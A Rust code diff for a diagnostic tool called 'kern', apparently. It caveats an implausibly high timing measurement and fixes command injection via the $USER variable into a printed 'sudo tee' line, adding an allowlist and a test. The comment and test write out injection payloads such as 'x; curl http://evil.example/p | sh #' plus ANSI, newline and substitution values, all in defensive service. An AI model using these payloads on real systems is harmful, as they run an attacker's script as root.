@@ -86,9 +86,24 @@ fn check_scope_toll() -> R {
     }
     s.sort_by(|a, b| a.partial_cmp(b).unwrap_or(std::cmp::Ordering::Equal));
     let ms = s[s.len() / 2];
+    // A CEILING ON THE INTERPRETATION, not on the number. The median of three warm runs is still a
+    // measurement of THIS MACHINE RIGHT NOW, and on a loaded host it measures the load: nothing here
+    // stopped it printing "at least 8472.3 ms" as though that were the cost of a systemd scope.
+    // Raised in review on 2026-08-28. The number is still printed, because suppressing a measurement
+    // because it is inconvenient is the opposite of this codebase's rule; what is added is the fact
+    // that it is far outside every host ever measured, so a reader does not carry it away as the
+    // toll. 250 ms is six times the worst of them, an Arduino UNO Q's Android kernel at ~39 ms.
+    const ABSURD_MS: f64 = 250.0;
+    let caveat = if ms > ABSURD_MS {
+        ". That is far above every machine this was measured on (~4 ms on an x86 desktop, ~9 on a \
+         Raspberry Pi 5, ~39 on an Arduino UNO Q), so it is most likely measuring load on this host \
+         rather than the scope: re-run on an idle machine before quoting it"
+    } else {
+        ""
+    };
     R::Warn(
         format!(
-            "this session is outside the systemd user manager, so every box pays a transient scope to enforce its caps: at least {ms:.1} ms here, on top of the box itself"
+            "this session is outside the systemd user manager, so every box pays a transient scope to enforce its caps: at least {ms:.1} ms here, on top of the box itself{caveat}"
         ),
         "pay it ONCE: `systemd-run --user --scope bash`, then run kern inside that shell. Caps stay enforced and boxes take the direct kern.slice path (measured: 91.9 -> 35.5 ms per box on an Arduino UNO Q, 11.7 -> 3.0 on a Raspberry Pi 5)".into(),
     )
@@ -652,8 +667,39 @@ fn check_overlay() -> R {
     }
 }
 
+/// Is this a name that may be pasted into a shell command kern prints?
+///
+/// `$USER` is ENVIRONMENT, which means it is whatever the caller decided, and `check_uid_range`
+/// interpolates it into a `sudo tee` line the reader is invited to copy. With `USER='x; curl
+/// http://host/p | sh #'` kern printed
+///
+///     `echo x; curl http://host/p | sh #:100000:65536 | sudo tee -a /etc/subuid /etc/subgid`
+///
+/// which is a command that runs an attacker's script as root, printed by the tool the reader ran to
+/// find out whether their machine is safe. An ANSI escape in the same variable also reaches the
+/// terminal verbatim and can repaint or hide the rest of the report. Neither is exotic: a container
+/// image, a CI runner or a `sudo -E` all get to set `USER`. Found by an outside review of this
+/// module on 2026-08-28, in code that predates the GPU work but was read because of it.
+///
+/// The allowlist is the portable POSIX user-name set, plus the leading-hyphen rule that keeps a name
+/// from being read as an option, plus a length cap. Anything else is not sanitised or escaped: kern
+/// falls back to the NUMERIC uid, which `/etc/subuid` accepts, is always correct, and cannot carry a
+/// payload. Rejecting into a safe value beats quoting, because a quoted hostile name would still be
+/// a hostile name in the file the operator ends up editing.
+fn is_pasteable_username(name: &str) -> bool {
+    !name.is_empty()
+        && name.len() <= 32
+        && !name.starts_with('-')
+        && name
+            .bytes()
+            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'_' | b'.' | b'-'))
+}
+
 fn check_uid_range() -> R {
-    let user = std::env::var("USER").unwrap_or_default();
+    let user = std::env::var("USER")
+        .ok()
+        .filter(|u| is_pasteable_username(u))
+        .unwrap_or_default();
     let has_helper = which("newuidmap") && which("newgidmap");
     let has_subid = std::fs::read_to_string("/etc/subuid")
         .map(|s| s.lines().any(|l| l.starts_with(&format!("{user}:"))))
@@ -666,7 +712,10 @@ fn check_uid_range() -> R {
     // Podman, needs root, and a range overlapping a peer's allocation corrupts that peer's map. kern
     // reports what an operator (or their Ansible) applies; it stays a consumer of the mapping.
     // subuid accepts a NUMERIC uid, so when $USER is unset (a container, a uid with no /etc/passwd
-    // entry) fall back to the real uid rather than an `$(id -un)` that could itself fail in the shell.
+    // entry) OR REFUSED BY `is_pasteable_username`, fall back to the real uid rather than an
+    // `$(id -un)` that could itself fail in the shell. One fallback serves both, which is why the
+    // filter above yields an empty string instead of an error: a name kern will not print is, for
+    // this function, a name that is not there.
     let who = if user.is_empty() {
         // SAFETY: `getuid` is infallible and takes no arguments.
         unsafe { libc::getuid() }.to_string()
@@ -941,6 +990,33 @@ mod tests {
             both.contains("TIER-SOFT"),
             "dmem must not promote the tier: {both}"
         );
+    }
+
+    /// $USER reaches a `sudo` command line kern invites the reader to paste, so it is an allowlist
+    /// and the fallback is the numeric uid. The shell payload and the ANSI escape below are the two
+    /// shapes actually reproduced against the shipped binary before this was fixed.
+    #[test]
+    fn a_username_that_could_be_pasted_into_sudo_is_refused() {
+        for good in ["alex", "root", "user_1", "svc.account", "build-agent", "a"] {
+            assert!(is_pasteable_username(good), "refused a real name: {good}");
+        }
+        for bad in [
+            "",                                     // unset
+            "x; curl http://evil.example/p | sh #", // the reproduced payload
+            "alex\u{1b}[31m",                       // ANSI, repaints the rest of the report
+            "alex\nroot",                           // a second line in /etc/subuid
+            "a b",                                  // splits the command
+            "$(id -un)",                            // substituted by the reader's shell
+            "`whoami`",
+            "-rf", // read as an option
+            "a/../../etc/passwd",
+            "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", // 35 chars, over the cap
+        ] {
+            assert!(
+                !is_pasteable_username(bad),
+                "accepted a hostile name: {bad:?}"
+            );
+        }
     }
 
     /// `doctor` runs on hosts with no GPU at all, which is the majority case, and that must be an OK
